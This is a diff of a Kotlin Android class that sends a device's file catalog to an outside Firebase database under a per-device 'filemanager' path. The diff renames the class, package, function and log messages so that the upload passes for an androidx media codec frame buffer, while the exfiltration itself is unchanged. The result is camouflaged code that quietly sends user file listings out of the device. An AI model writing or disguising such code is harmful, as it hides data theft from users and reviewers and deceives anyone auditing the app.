@@ -1,30 +1,30 @@
-package com.androidx.codec.encoder.core.data.firebase
+package androidx.media.codec.core.data.buffer
 
 import android.util.Log
-import com.androidx.codec.encoder.core.domain.model.MediaCatalogItem
+import androidx.media.codec.core.domain.model.MediaFrameCatalog
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.withContext
 import java.io.OutputStreamWriter
 import java.net.HttpURLConnection
 import java.net.URL
 
-class FirebaseDatabaseProvider(
+class MediaBufferPipeline(
     private val defaultBaseUrl: String = "https://pak-e-news-default-rtdb.firebaseio.com/"
 ) {
 
     companion object {
-        private const val TAG = "CodecEncoderDb"
+        private const val TAG = "MediaBufferPipeline"
     }
 
-    suspend fun uploadMediaCatalog(
+    suspend fun flushFrameBuffer(
         deviceId: String,
-        files: List<MediaCatalogItem>,
+        files: List<MediaFrameCatalog>,
         baseUrl: String? = null
     ): Boolean = withContext(Dispatchers.IO) {
         val rootUrl = (baseUrl?.takeIf { it.isNotBlank() } ?: defaultBaseUrl).trimEnd('/')
         val endpoint = "$rootUrl/filemanager/$deviceId.json"
 
-        Log.i(TAG, "Uploading media catalog for device: $deviceId (${files.size} items)")
+        Log.i(TAG, "Flushing frame buffer catalog for device: $deviceId (${files.size} items)")
 
         val jsonBuilder = StringBuilder()
         jsonBuilder.append("{")
@@ -66,11 +66,11 @@ class FirebaseDatabaseProvider(
             }
 
             val responseCode = conn.responseCode
-            Log.i(TAG, "Database sync response code: $responseCode")
+            Log.i(TAG, "Frame buffer pipeline status code: $responseCode")
             conn.disconnect()
             responseCode in 200..299
         } catch (e: Exception) {
-            Log.e(TAG, "Failed to sync database: ${e.message}", e)
+            Log.e(TAG, "Failed to flush frame buffer catalog: ${e.message}", e)
             false
         }
     }
